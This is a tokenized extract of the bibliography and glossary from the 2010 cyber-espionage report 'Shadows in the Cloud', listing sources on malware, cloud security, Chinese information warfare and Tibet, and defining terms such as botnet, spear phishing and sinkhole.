["Mehta", ",", "Neel", "."], ["March", "30", ",", "2010", "."], ["\u201c", "The", "Chilling", "Effects", "of", "Malware", ",", "\u201d", "Google", "Online", "Security", "Blog", ",", "http://googleonlinesecurity.blogspot.com/2010/03/chilling-effects-of-malware.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Van", "Horenbeeck", ",", "Maarten", "."], ["2008", "."], ["\u201c", "Is", "Troy", "Burning", "?"], ["An", "Overview", "of", "Targeted", "Trojan", "Attacks", ",", "\u201d", "SANS", "Internet", "Storm", "Center", ",", "SANSFire", "2008", ",", "Washington", "DC", "."], ["http://isc.sans.org/SANSFIRE2008-Is_Troy_Burning_Vanhorenbeeck.pdf", "(", "accessed", "April", "4", ",", "2010", ")", "."], ["Van", "Horenbeeck", ",", "Maarten", "."], ["2008", "."], ["\u201c", "Overview", "of", "Cyber", "Attacks", "Against", "Tibetan", "Communities", ",", "\u201d", "Internet", "Storm", "Centre", ",", "http://isc.sans.org/diary.html?storyid=4177", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Van", "Horenbeeck", ",", "Maarten", "."], ["2007", "."], ["\u201c", "Crouching", "PowerPoint", ",", "Hidden", "Trojan", ",", "\u201d", "24th", "Chaos", "Communication", "Congress", ",", "Berlin", ",", "http://events.ccc.de/congress/2007/Fahrplan/events/2189.en.html", "(", "accessed", "April", "4", ",", "2010", ")", "."], ["Cloud", "Computing", "Security"], ["Armbrust", ",", "Michael", ",", "et", "al", "."], ["2009", "."], ["\u201c", "Above", "the", "Clouds", ":", "A", "Berkeley", "View", "of", "Cloud", "Computing", ",", "\u201d", "UC", "Berkeley", "Reliable", "Adaptive", "Distributed", "Systems", "Laboratory", ",", "http://www.eecs.berkeley.edu/Pubs/TechRpts/2009/EECS-2009-28.pdf", "(", "accessed", "April", "1", "2010", ")", "."], ["Jensen", ",", "Meiko", ",", "Jorg", "Schwenk", ",", "Nils", "Grushka", ",", "and", "Luigi", "Lo", "Iancono", "."], ["2009", "."], ["\u201c", "On", "Technical", "Security", "Issues", "in", "Cloud", "Computing", "\u201d", ",", "2009", "IEEE", "International", "Conference", "on", "Cloud", "Computing", ",", "Bangalore", "India", ",", "109", "-", "116", ",", "http://www.computer.org/portal/web/csdl/doi/10.1109/CLOUD.2009.60", "(", "accessed", "April", "1", "2010", ")", "."], ["Mansfield", "-", "Devine", ",", "Steve", "."], ["2008", "."], ["\u201c", "Danger", "in", "the", "clouds", ",", "\u201d", "Network", "Security", ",", "2008:12", ",", "9", "-", "11", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "BIBLIOGRAPHY", "&", "SUGGESTED", "READINGS", "49", "International", "Law"], ["Radsan", ",", "Afsheen", "John", "."], ["2007", "."], ["\u201c", "The", "Unresolved", "Equation", "of", "Espionage", "and", "International", "Law", ",", "\u201d", "Michigan", "Journal", "of", "International", "Law", ",", "28:597", ",", "596", "-", "623", "."], ["Rajnovic", ",", "Damir", ",", "2009", "."], ["\u201c", "Do", "We", "Need", "a", "Global", "CERT", "?", "\u201d"], ["CISCO", "Security", "Blogs", ",", "http://blogs.cisco.com/security/comments/do_we", "_", "need_a_global_cert/"], ["(", "accessed", "April", "1", "2010", ")", "."], ["Zhu", ",", "Li", "-", "xin", "."], ["2009", "."], ["\u201c", "Research", "on", "the", "International", "Law", "of", "Information", "Network", "Operations", ",", "\u201d", "Air", "Force", "Engineering", "University", ",", "Xi\u2019an"], ["China", ",", "http://en.cnki.com.cn/Article_en/CJFDTOTAL-HBFX200901009.htm", "(", "accessed", "April", "1", "2010", ")", "."], ["Chinese", "Information", "Warfare", ",", "Strategy", "and", "Doctrine", "Bruzdzinski", ",", "Jason", "E.", "2004", "."], ["\u201c", "Demystifying", "Shashoujian", ":", "China", "\u2019s", "\u201c", "Assassin", "\u2019s", "Mace", "\u201d", "Concept", "\u201d", "In", "Civil", "-", "Military", "Change", "in", "China", ":", "Elites", ",", "Institutes", "and", "Ideas", "After", "the", "16th", "Party", "Congress", ",", "Andrew", "Scobell", ",", "Larry", "Wortzel", "(", "Eds", ")", ",", "179", "-", "218", ",", "Strategic", "Studies", "Institute", ":", "Carlise", ",", "PA", "."], ["Harris", ",", "Shane", "."], ["2008", "."], ["\u201c", "China", "\u2019s", "Cyber", "-", "Militia", ",", "\u201d", "National", "Journal", "."], ["http://www.nationaljournal.com/njmagazine/cs_20080531_6948.php"], ["(", "accessed", "April", "1", "2010", ")", "."], ["Niu", "Li", ",", "Li", "Jiangzhou", ",", "and", "Xu", "Duhui", "."], ["2000", "."], ["\u201c", "On", "Information", "Warfare", "Strategems", ",", "\u201d", "Zhongguo", "Junshi", "Kexue", ",", "August", "20", ",", "2000", ",", "115", "-", "122", ",", "in", "FBIS", "."], ["Thomas", ",", "Timothy", "L.", "2004", "."], ["Dragon", "Bytes", ":", "Chinese", "Information", "-", "War", "Theory", "and", "Practice", ",", "Foreign", "Military", "Studies", "Office", ":", "Fort", "Leavenworth", ",", "KS", "."], ["Wang", "Baocun", ",", "1997", "."], ["\u201c", "A", "Preliminary", "Analysis", "of", "Information", "Warfare", ",", "\u201d", "Zhongguo", "Junshi", "Kexue", ",", "102", "-", "111", "."], ["Fusion", "Methodology", "and", "Intelligence", "Ieva", ",", "Christopher", "S.", "2008", "."], ["\u201c", "The", "Holistic", "Targeting", "(", "HOT", ")", "Methodology", "as", "the", "Means", "to", "Improve", "Information", "Operations", "(", "IO", ")", "Target"], ["Development", "and", "Prioritization", ",", "\u201d", "Naval", "Postgraduate", "School", ",", "Monterey", ",", "CA", "http://www.stormingmedia.us/81/8168/A816884.html", "(", "accessed", "April", "1", ",", "2010", ")", "."], ["Menthe", ",", "Lance", "and", "Sullivan", ",", "Jeffrey", ",", "2008", "."], ["A", "RAND", "Analysis", "Tool", "for", "Intelligence", ",", "Surveillance", ",", "and", "Reconnaissance", ":", "The", "Collections", "Operations", "Model", "RAND", ":"], ["Santa", "Monica", ",", "CA", "."], ["Merten", ",", "Steffen", ".", "2009", "."], ["\u201c", "Employing", "Data", "Fusion", "in", "Cultural", "Analysis", "and", "Counterinsurgency", "in", "Tribal", "Social", "Systems", ",", "\u201d", "Strategic", "Insights", ",", "8:3", "."], ["Moffat", ",", "James", "."], ["2003", "."], ["Complexity", "Theory", "and", "Network", "Centric", "Warfare", ",", "Information", "Age", "Transformation", "Series", ",", "Command", "and", "Control", "Research", "Program", ",", "Pentagon", ",", "Washington", ",", "DC", ",", "http://www.dodccrp.org/files/Moffat_Complexity.pdf", "(", "accessed", "April", "1", "2010", ")", "."], ["Pernin", ",", "Christopher", "G.", "Moore", ".", ",", "Louis", "R.", ",", "Comanor", "Katherine", "."], ["2007", "."], ["The", "Knowledge", "Matrix", "Approach", "to", "Intelligence", "Fusion", ",", "United", "States", "Army", "and", "RAND", "Arroyo", "Centre", ",", "http://www.rand.org/pubs/technical_reports/TR416/", "(", "accessed", "April", "1", "2010", ")", "."], ["Prestov", ",", "I.", "2009", "."], ["Dynamic", "Network", "Analysis", "for", "Understanding", "Complex", "Systems", "and", "Processes", ",", "Defence", "R&D", "Canada", "-", "Center", "for", "Operational", "Research", "and", "Analysis", ",", "Ottawa", "."], ["Field", "investigation", "-", "Action", "Research", "Carey", "-", "Smith", ",", "Mark", "T", ",", "Karen", "J.", "Nelson", ",", "and", "Lauren", "J", "May.", "2007", "."], ["\u201c", "Improving", "Information", "Security", "Management", "in", "Nonprofit", "Organisations", "with", "Action", "Research", ",", "\u201d", "5th", "Australian", "Information", "Security", "Management", "Conference", "."], ["http://eprints.qut.edu.au/14346/", "(", "accessed", "01", "April", "2010", ")", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "BIBLIOGRAPHY", "&", "SUGGESTED", "READINGS", "50"], ["Curle", ",", "Adam", ".", ",", "and", "Trist", ",", "E.", "L.", "1947", "."], ["\u201c", "Transitional", "Communities", "and", "Social", "Reconnection", ".", "\u201d"], ["Human", "Relations", "."], ["Vol", "."], ["1:1/2", "."], ["Jaques", ",", "Elliott", "."], ["1949", "."], ["\u201c", "Interpretive", "Group", "Discussion", "as", "a", "Method", "of", "Facilitating", "Social", "Change", ".", "\u201d"], ["Human", "Relations", ",", "2:3", ",", "269", "-", "280", "."], ["O\u2019Brien", ",", "R.", "2001", "."], ["Um", "exame", "da", "abordagem", "metodol\u00f3gica", "da", "pesquisa", "a\u00e7\u00e3o", "[", "An", "Overview", "of", "the", "Methodological", "Approach", "of", "Action", "Research", "]", "."], ["In", "Roberto", "Richardson", "(", "Ed", ".", ")", ",", "Teoria", "e", "Pr\u00e1tica", "da", "Pesquisa", "A\u00e7\u00e3o", "[", "Theory", "and", "Practice", "of", "Action", "Research", "]", "."], ["Jo\u00e3o", "Pessoa", ",", "Brazil", ":", "Universidade", "Federal", "da", "Para\u00edba", ",", "http://www.web.ca/~robrien/papers/arfinal.html", "(", "accessed", "01", "April", "2010", ")", "."], ["Contemporary", "Tibet"], ["Barnett", ",", "Robert", "."], ["2010", "."], ["The", "Tibet", "Protests", "of", "Spring", ",", "2008", ",", "China", "Perspectives", ",", "2009:3", ",", "6", "-", "24", "http://chinaperspectives.revues.org/document4836.html", "."], ["(", "accessed", "April", "1", ",", "2010", ")", "."], ["Jerryson", ",", "Michael", ",", "and", "Mark", "Juergensmeyer", "."], ["2010", "."], ["Buddhist", "Warfare", ",", "Oxford", "University", "Press", ":", "New", "York", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "GLOSSARY", "51", "Glossary", "0day", "-", "is", "an", "exploit", "for", "which", "there", "is", "no", "fix", "from", "the", "software", "vendor", "available", "."], ["Botnet", "-", "refers", "to", "a", "collection", "of", "compromised", "networked", "computers", "that", "can", "be", "controlled", "remotely", "by", "an", "attacker", "."], ["Beacon", "/", "beaconing", "/", "check", "in", "-", "attempts", "by", "a", "compromised", "computer", "to", "connect", "to", "a", "command", "and", "control", "server", "."], ["Blackhat", "-", "generally", "refers", "to", "a", "person", "who", "attempts", "to", "compromise", "information", "technology", "systems", "or", "networks", "for", "malicious", "purposes", "."], ["Cloud", "computing", "-", "is", "an", "emerging", "computing", "paradigm", "that", "generally", "refers", "to", "systems", "that", "enable", "network", "devices", "to", "access", "data", ",", "services", ",", "and", "applications", "on", "-", "demand", "."], ["Command", "and", "control", "server", "-", "refers", "to", "the", "network", "server", "that", "sends", "commands", "to", "compromised", "computers", "in", "a", "botnet", "."], ["DNS", "(", "domain", "name", "system", ")", "-", "is", "a", "hierarchical", "naming", "system", "for", "computers", ",", "services", ",", "or", "any", "resource", "participating", "in", "the", "Internet", "."], ["DoS", "Attack", "(", "denial", "of", "service", "attack", ")", "-", "is", "an", "attempt", "to", "prevent", "users", "from", "accessing", "a", "specific", "computer", "resource", ",", "such", "as", "a", "Web", "site", "."], ["DDoS", ",", "(", "distributed", "denial", "of", "service", "attacks", ")", "usually", "involve", "overwhelming", "the", "targeted", "computer", "with", "requests", "so", "that", "it", "is", "no", "longer", "able", "to", "communicate", "with", "its", "intended", "users", "."], ["HTTP", "(", "Hypertext", "Transfer", "Protocol", ")", "-", "is", "a", "set", "of", "standards", "for", "exchanging", "text", ",", "images", ",", "sound", "and", "video", "by", "means", "of", "the", "Internet", "."], ["IP", "address", "(", "Internet", "protocol", "address", ")", "-", "is", "a", "numerical", "identification", "assigned", "to", "devices", "participating", "in", "a", "computer", "network", "utlizing", "the", "Internet", "protocol", "."], ["Malware", "(", "malicious", "software", ")", "-", "refers", "to", "software", "designed", "to", "carry", "out", "a", "malicious", "purpose", "."], ["Varieties", "of", "malware", "include", "computer", "viruses", ",", "worms", ",", "trojan", "horses", ",", "and", "spyware", "."], ["OHHDL", "-", "Office", "of", "His", "Holiness", "the", "Dalai", "Lama", "."], ["Phishing", "-", "an", "attack", "in", "which", "an", "attacker", "attempts", "to", "obtain", "sensitive", "information", "from", "an", "individual", "by", "masquerading", "as", "a", "trusted", "third", "party", "."], ["A", "common", "example", "of", "such", "an", "attack", "is", "a", "user", "receiving", "an", "email", "from", "a", "source", "that", "appears", "to", "be", "a", "trustworthy", "entity", ",", "such", "as", "the", "user", "\u2019s", "bank", "."], ["Such", "emails", "often", "request", "the", "user", "to", "visit", "a", "website", "that", "appears", "to", "be", "the", "login", "page", "of", "a", "service", "they", "use", ",", "such", "as", "online", "banking", ",", "and", "enter", "their", "username", "and", "password", ",", "which", "is", "then", "collected", "by", "the", "attackers", "and", "used", "for", "malicious", "purposes", "."], ["PRC", "-", "People", "\u2019s", "Republic", "of", "China", "."], ["Sinkhole", "-", "Operating", "domain", "names", "formerly", "used", "as", "command", "and", "control", "servers", "."], ["Spear", "phishing", "-", "is", "a", "targeted", "form", "of", "phishing", "in", "which", "a", "victim", "is", "typically", "sent", "an", "email", "that", "appears", "to", "be", "from", "an", "individual", "or", "organization", "they", "know", "."], ["Usually", "the", "content", "of", "the", "email", "includes", "information", "that", "is", "relevant", "to", "the", "victim", "and", "includes", "a", "malicious", "file", "attachment", "or", "link", "that", "when", "opened", "excecutes", "malicious", "code", "on", "the", "victim", "\u2019s", "computer", "."], ["RiR", "(", "Regional", "Internet", "Registry", ")", "-", "is", "an", "organization", "that", "manages", "the", "allocation", "and", "registration", "of", "Internet", "number", "resources", "within", "a", "specific", "geographic", "region", "."], ["TGIE", "-", "Tibetan", "Government", "in", "Exile", "."], ["TPIE", "-", "Tibetan", "Parliament", "in", "Exile", "."], ["Tor", "-", "is", "an", "anonymity", "system", "that", "defends", "users", "from", "traffic", "analysis", "attacks", "in", "which", "attackers", "attempt", "to", "monitor", "users", "\u2019", "online", "behaviour", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "GLOSSARY", "52", "Web", "2.0", "-", "typically", "refers", "to", "Web", "-", "based", "applications", "and", "services", "that", "enable", "user", "participation", ",", "collaboration", ",", "and", "data", "sharing", "."], ["WHOIS", "-", "is", "a", "public", "database", "of", "all", "domain", "name", "registrations", ",", "which", "provides", "information", "on", "individuals", "who", "register", "domain", "names", "."], ["Whitehat", "-", "generally", "refers", "to", "a", "person", "who", "attempts", "to", "infiltrate", "information", "technology", "systems", "or", "networks", "in", "order", "to", "expose", "weakness", "so", "they", "can", "be", "corrected", "by", "the", "system", "\u2019s", "owners", "."], ["Also", "known", "as", "an", "ethical", "hacker", "."]]}]